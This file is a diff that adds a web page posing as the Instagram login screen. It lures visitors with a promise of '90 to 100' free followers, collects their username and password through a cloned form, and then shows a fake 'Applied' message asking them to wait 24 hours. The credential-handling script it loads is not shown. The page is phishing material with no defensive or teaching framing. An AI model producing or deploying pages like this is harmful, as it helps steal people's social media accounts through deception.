@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <script src="https://kit.fontawesome.com/e4859e641f.js" crossorigin="anonymous"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Libertinus+Math&family=Oswald:wght@200..700&family=Playfair+Display:ital,wght@0,400..900;1,400..900&display=swap');
+        input:focus~label{
+            font-size: 0.8rem;
+            top: 0;
+            
+        }
+        .input-parent:focus-within{
+            border: 1.5px solid gray;
+        }
+        i{
+            visibility: hidden;
+        }
+        #afterLog{
+            font-family:  "Playfair Display";
+            text-align: center;
+        }
+    </style>
+    <link rel="stylesheet" href="src/output.css">
+</head>
+<body class="bg-[#e7ebf1dd]">
+    
+    <div id="instruction" class=" absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 capitalize bg-[#03A6A1] w-[300px] px-8 py-8 rounded-lg text-white space-y-4">
+        <h1 class="text-center text-3xl font-bold text-gray-900">Steps To Follow</h1>
+        <p class=" font-semibold">1. Log In With Instagram to get real Followers</p>
+        <p class=" font-semibold">2. Make sure you account is public</p>
+        <p class=" font-semibold">3. wait for 24 hours after apply</p>
+        <p class=" font-semibold">4. dont apply multiple times</p>
+        <p class=" font-semibold">5. After log in wait for few seconds</p>
+
+        <button id="okayBtn" class="bg-[#FF4F0F] w-full py-4 rounded-lg mt-4 font-semibold active:scale-98 cursor-pointer">Okay</button>
+    </div>
+
+    <div id="afterLog" class="hidden absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 capitalize bg-[#FF3F33] w-[300px] px-8 py-8 rounded-lg text-white space-y-4 shadow-[0px_0px_20px_5px_lightblue,0px_0px_20px_10px_black]">
+        <h1 class="text-center text-3xl font-bold text-[#9FC87E]">Applied</h1>
+        <p class="mt-8">Wait For 24 hours you will recieve 90 to 100 followers within 24 hours keep  patience</p>
+
+        <a href="home.html" class="bg-[#075B5E]  rounded-lg  font-semibold active:scale-98 text-center py-4"><button id="doneBtn" class="cursor-pointer w-full mt-8">Done</button></a>
+    </div>
+
+
+
+    <div id="instagram" class="hidden mt-2 max-w-[360px] mx-auto">
+        <p class="text-center">English (US)</p>
+        <div id="logo" class="mt-12">
+            <img class="w-14 mx-auto" src="logo.png" alt="">
+        </div>
+        <form name="log-in" method="post" action="" class="px-4 space-y-4 mt-18">
+            <div class="input-parent relative w-full border-1 border-gray-400 p-4 rounded-xl bg-white outline-none">
+            <input class="border-none outline-none w-full" 
+            type="text" id="username" name="username" required>
+            <label for="username" class="absolute left-4 top-4 text-gray-600 font-semibold" id="user_label">Username,email or mobile number</label>
+            </div>
+            <div class="input-parent relative w-full border-1 border-gray-400 p-4 rounded-xl bg-white  outline-none">
+                <input class="border-none outline-none w-full" 
+             type="password" id="password" name="password" required>
+             <label for="password" class="absolute left-4 top-4 text-gray-600 font-semibold" id="password_label">Password</label>
+            <i id="visibility" class="fa-solid fa-eye-slash absolute right-4 top-5 cursor-pointer"></i>
+            </div>
+            
+            <button type="submit" class="block bg-blue-600 text-white py-2 w-full rounded-full cursor-pointer">Log in</button>
+        </form>
+        <a href="#"><p class="text-center mt-4">Forgot password?</p></a>
+        <div id="new" class="px-4 mt-32">
+            <button class="w-full border-1 rounded-full border-blue-700 text-blue-900 py-2 font-semibold">Create new acount</button>
+            <img src="meta.png" class="h-16 mx-auto">
+        </div>
+    </div>
+
+<script src="script.js"></script>
+</body>
+</html>
